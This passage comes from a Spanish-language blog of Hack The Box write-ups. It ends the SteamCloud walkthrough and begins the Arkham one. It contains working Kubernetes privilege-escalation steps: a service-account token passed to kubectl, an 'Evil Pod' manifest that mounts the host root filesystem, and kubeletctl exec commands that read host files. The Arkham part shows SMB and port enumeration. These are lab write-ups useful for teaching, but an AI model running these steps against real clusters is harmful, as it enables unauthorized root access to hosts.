                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/version/]                           &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/version]                            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/version]                            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos de la siguiente forma&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Privesc creando un pod kubernetes&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Creando un pod/ contenedor para montar todo el sistema victima en el directorio /mnt del pod que vamos a crear&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token=&apos;eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw&apos; get pods nginx -o yaml &amp;gt; pod.yaml&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a leer el archivo guardado en formato yaml&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cat pod.yaml &lt;/span&gt;

apiVersion: v1                                                                                                                                                                                                     
metadata:                                                                                                                                                                                                          
  annotations:                                                                                                                                                                                                     
    kubectl.kubernetes.io/last-applied-configuration: |                                                                                                                                                            
      &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;apiVersion&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;v1&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;kind&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Pod&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;metadata&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;annotations&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;nginx&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;namespace&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;default&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;spec&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;containers&quot;&lt;/span&gt;:[&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;image&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;nginx:1.14.2&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;imagePullPolicy&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Never&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;nginx&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;volumeMounts&quot;&lt;/span&gt;:[&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;m
ountPath&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;/root&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;flag&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}]}]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;volumes&quot;&lt;/span&gt;:[&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hostPath&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;path&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;/opt/flag&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;flag&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}]}}&lt;/span&gt;                                                                                                                  
  creationTimestamp: &lt;span class=&quot;s2&quot;&gt;&quot;2022-04-04T12:31:02Z&quot;&lt;/span&gt;                                                                                                                                                                        
  name: nginx                                                                                                                                                                                                      
  namespace: default                                                                                                                                                                                               
  resourceVersion: &lt;span class=&quot;s2&quot;&gt;&quot;514&quot;&lt;/span&gt;                                                                                                                                                                                           
  uid: ef1ce363-54c9-4404-a870-331df0966b4f                                                                                                                                                                        
spec:                                                                                                                                                                                                              
  containers:                                                                                                                                                                                                      
  - image: nginx:1.14.2                                                                                                                                                                                            
    imagePullPolicy: Never                                                                                                                                                                                         
    name: nginx                                                                                                                                                                                                    
    resources: &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;                                                                                                                                                                                                  
    terminationMessagePath: /dev/termination-log                                                                                                                                                                   
    terminationMessagePolicy: File                                                                                                                                                                                 
    volumeMounts:                                                                                                                                                                                                  
    - mountPath: /root                                                                                                                                                                                             
      name: flag                                                                                                                                                                                                   
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount                                                                                                                                                     
      name: kube-api-access-xdscg                                                                                                                                                                                  
      readOnly: &lt;span class=&quot;nb&quot;&gt;true                                                                                                                                                                                               
  &lt;/span&gt;dnsPolicy: ClusterFirst                                                                                                                                                                                          
  enableServiceLinks: &lt;span class=&quot;nb&quot;&gt;true                                                                                                                                                                                         
  &lt;/span&gt;nodeName: steamcloud                                                                                                                                                                                             
  preemptionPolicy: PreemptLowerPriority                                                                                                                                                                           
  priority: 0                                                                                                                                                                                                      
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:                                                                                                                                                                                                     
  - effect: NoExecute                                                                                                                                                                                              
    key: node.kubernetes.io/not-ready                                                                                                                                                                              
    operator: Exists                                                                                                                                                                                               
    tolerationSeconds: 300                                                                                                                                                                                         
  - effect: NoExecute                                                                                                                                                                                              
    key: node.kubernetes.io/unreachable                                                                                                                                                                            
    operator: Exists                                                                                                                                                                                               
    tolerationSeconds: 300                                                                                                                                                                                         
  volumes:                                                                                                                                                                                                         
  - hostPath:                                                                                                                                                                                                      
      path: /opt/flag                                                                                                                                                                                              
      &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;                                                                                                                                                                                                     
    name: flag                                                                                                                                                                                                     
  - name: kube-api-access-xdscg                                                                                                                                                                                    
    projected:                                                                                                                                                                                                     
      defaultMode: 420                                                                                                                                                                                             
      sources:                                                                                                                                                                                                     
      - serviceAccountToken:                                                                                                                                                                                       
          expirationSeconds: 3607 
    path: token                                                                                                                                                                                      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0/1525]
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: &lt;span class=&quot;s2&quot;&gt;&quot;2022-04-04T12:31:02Z&quot;&lt;/span&gt;
    status: &lt;span class=&quot;s2&quot;&gt;&quot;True&quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: Initialized
  - lastProbeTime: null
    lastTransitionTime: &lt;span class=&quot;s2&quot;&gt;&quot;2022-04-04T12:31:04Z&quot;&lt;/span&gt;
    status: &lt;span class=&quot;s2&quot;&gt;&quot;True&quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: Ready
  - lastProbeTime: null
    lastTransitionTime: &lt;span class=&quot;s2&quot;&gt;&quot;2022-04-04T12:31:04Z&quot;&lt;/span&gt;
    status: &lt;span class=&quot;s2&quot;&gt;&quot;True&quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: &lt;span class=&quot;s2&quot;&gt;&quot;2022-04-04T12:31:02Z&quot;&lt;/span&gt;
    status: &lt;span class=&quot;s2&quot;&gt;&quot;True&quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: PodScheduled
  containerStatuses:
  - containerID: docker://f52ba68de2041b33f93bb3b11c30408cbee6d02ce1b2b1e9548abb04c3770a8d
    image: nginx:1.14.2
    imageID: docker-pullable://nginx@sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d
    lastState: &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;
    name: nginx
    ready: &lt;span class=&quot;nb&quot;&gt;true
    &lt;/span&gt;restartCount: 0
    started: &lt;span class=&quot;nb&quot;&gt;true
    &lt;/span&gt;state:
      running:
        startedAt: &lt;span class=&quot;s2&quot;&gt;&quot;2022-04-04T12:31:03Z&quot;&lt;/span&gt;
  hostIP: 10.10.11.133
  phase: Running
  podIP: 172.17.0.3
  podIPs:
  - ip: 172.17.0.3
  qosClass: BestEffort
  startTime: &lt;span class=&quot;s2&quot;&gt;&quot;2022-04-04T12:31:02Z&quot;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;------------------------------&lt;/span&gt; pod.yaml &lt;span class=&quot;nt&quot;&gt;--------------------------------------&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Lo modificamos a lo siguiente: 
&lt;span class=&quot;nt&quot;&gt;-------------------------------&lt;/span&gt; Evil Pod.yaml &lt;span class=&quot;nt&quot;&gt;----------------------------------&lt;/span&gt;
apiVersion: v1
kind: Pod
metadata:
  name: koh-pod
  namespace: default
spec:
  containers:
  - name: koh-pod
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /

&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Desplegando el Pod malicioso&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Lo desplegamos de la siguiente forma

&lt;span class=&quot;c&quot;&gt;# kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token=&apos;eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw&apos; apply -f pod.yaml&lt;/span&gt;

pod/koh-pod created
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Verificamos los pods existentes

&lt;span class=&quot;c&quot;&gt;# kubeletctl -s 10.10.11.133 pods                                                                                     1 ⨯ 1 ⚙&lt;/span&gt;
┌─────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                                │
├────┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│    │ POD                                │ NAMESPACE   │ CONTAINERS              │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  1 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  2 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  3 │ koh-pod                            │ default     │ koh-pod                 │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  4 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  5 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  6 │ kube-proxy-zd55k                   │ kube-system │ kube-proxy              │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  7 │ coredns-78fcd69978-gl6gt           │ kube-system │ coredns                 │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  8 │ nginx                              │ default     │ nginx                   │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  9 │ kohh-pod                           │ default     │ kohh-pod                │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 10 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│    │                                    │             │                         │
└────┴────────────────────────────────────┴─────────────┴─────────────────────────┘

&lt;span class=&quot;c&quot;&gt;# kubeletctl -s 10.10.11.133 scan rce                                                                                 &lt;/span&gt;
┌──────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                   │
├────┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│    │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│    │              │                                    │             │                         │ RUN │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  1 │ 10.10.11.133 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  2 │              │ koh-pod                            │ default     │ koh-pod                 │ +   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  3 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  4 │              │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  5 │              │ kube-proxy-zd55k                   │ kube-system │ kube-proxy              │ +   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  6 │              │ coredns-78fcd69978-gl6gt           │ kube-system │ coredns                 │ -   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  7 │              │ nginx                              │ default     │ nginx                   │ +   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  8 │              │ kohh-pod                           │ default     │ kohh-pod                │ +   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│  9 │              │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
├────┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 10 │              │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
└────┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a conectarnos al pod-malicioso creado&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Comprobando que tenemos el directorio / montado en /mnt en el nuestro pod desplegado
&lt;span class=&quot;c&quot;&gt;# kubeletctl -s 10.10.11.133 -p koh-pod -c koh-pod exec &quot;ls -l /mnt&quot;   &lt;/span&gt;
total 60
lrwxrwxrwx   1 root root     7 Nov 30 11:36 bin -&amp;gt; usr/bin
drwxr-xr-x   3 root root  4096 Nov 30 18:43 boot
drwxr-xr-x  16 root root  3080 Apr  4 12:29 dev
drwxr-xr-x  75 root root  4096 Jan 10 14:03 etc
drwxr-xr-x   3 root root  4096 Nov 30 11:44 home
lrwxrwxrwx   1 root root    31 Nov 30 11:38 initrd.img -&amp;gt; boot/initrd.img-4.19.0-18-amd64
lrwxrwxrwx   1 root root    31 Nov 30 11:37 initrd.img.old -&amp;gt; boot/initrd.img-4.19.0-14-amd64
lrwxrwxrwx   1 root root     7 Nov 30 11:36 lib -&amp;gt; usr/lib
lrwxrwxrwx   1 root root     9 Nov 30 11:36 lib32 -&amp;gt; usr/lib32
lrwxrwxrwx   1 root root     9 Nov 30 11:36 lib64 -&amp;gt; usr/lib64
lrwxrwxrwx   1 root root    10 Nov 30 11:36 libx32 -&amp;gt; usr/libx32
drwx------   2 root root 16384 Nov 30 11:36 lost+found
drwxr-xr-x   3 root root  4096 Nov 30 11:36 media
drwxr-xr-x   2 root root  4096 Nov 30 11:36 mnt
drwxr-xr-x   5 root root  4096 Jan 10 14:03 opt
dr-xr-xr-x 204 root root     0 Apr  4 12:28 proc
drwx------   4 root root  4096 Jan 10 14:03 root
drwxr-xr-x  20 root root   620 Apr  4 12:30 run
lrwxrwxrwx   1 root root     8 Nov 30 11:36 sbin -&amp;gt; usr/sbin
drwxr-xr-x   2 root root  4096 Nov 30 11:36 srv
dr-xr-xr-x  13 root root     0 Apr  4 12:28 sys
drwxrwxrwt  11 root root  4096 Apr  4 13:47 tmp
drwxr-xr-x  14 root root  4096 Nov 30 12:17 usr
drwxr-xr-x  11 root root  4096 Nov 30 11:36 var
lrwxrwxrwx   1 root root    28 Nov 30 11:38 vmlinuz -&amp;gt; boot/vmlinuz-4.19.0-18-amd64
lrwxrwxrwx   1 root root    28 Nov 30 11:37 vmlinuz.old -&amp;gt; boot/vmlinuz-4.19.0-14-amd64
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sacando la pass root.txt&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# kubeletctl -s 10.10.11.133 -p koh-pod -c koh-pod exec &quot;ls -l /mnt/root/&quot;                                                 1 ⚙&lt;/span&gt;
total 4
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root 33 Apr  4 12:29 root.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;SteamCloud Rooted ~ K0H4ck&lt;/p&gt;</content><author><name>K0Hack</name></author><category term="HTB," /><category term="Kubernetes," /><category term="RCE," /><category term="Misconfigurations," /><category term="Malicius" /><category term="Pods/Container." /><summary type="html">SteamCloud ~ Hack The Box ~</summary></entry><entry><title type="html">Maquina Retirada Arkham de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2022/03/20/Arkham.html" rel="alternate" type="text/html" title="Maquina Retirada Arkham de Hack The Box (Necesario VIP)" /><published>2022-03-20T00:00:00-03:00</published><updated>2022-03-20T00:00:00-03:00</updated><id>http://localhost:4000/2022/03/20/Arkham</id><content type="html" xml:base="http://localhost:4000/2022/03/20/Arkham.html">&lt;h1 id=&quot;arkham--hack-the-box--batman&quot;&gt;Arkham ~ Hack The Box ~ Batman&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.10.130       &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos con el siguiente escaneo de Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
8080/tcp  open  http          Apache Tomcat 8.5.37
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Mask Inc.
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2022-01-20T13:28:10
|_  start_date: N/A
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Lanzamos Whatweb&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cat nmap/Whatweb &lt;/span&gt;
http://10.10.10.130 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.130], Microsoft-IIS[10.0], Title[IIS Windows Server]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a enumerar el puerto 445&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.130 -u &quot;null&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Guest session       IP: 10.10.10.130:445    Name: 10.10.10.130                                      
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
        BatShare                                                READ ONLY       Master Waynes secrets
        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   READ ONLY       Remote IPC
        Users                                                   READ ONLY

&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.130 -u &quot;null&quot; -r &quot;BatShare&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Guest session       IP: 10.10.10.130:445    Name: 10.10.10.130                                      
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        BatShare                                                READ ONLY
        .&lt;span class=&quot;se&quot;&gt;\B&lt;/span&gt;atShare&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dr--r--r--                0 Sun Feb  3 14:04:13 2019    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Sun Feb  3 14:04:13 2019    ..
        fr--r--r--          4046695 Sun Feb  3 14:04:13 2019    appserver.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos traemos a nuestro equipo el recurso appserver.zip&lt;/p&gt;

&lt;p&gt;Descomprimimos el archivo&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# unzip content/appserver.zip &lt;/span&gt;
Archive:  content/appserver.zip
  inflating: IMPORTANT.txt           
  inflating: backup.img
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a ver el formato del archivo img con la herramienta file&lt;/p&gt;
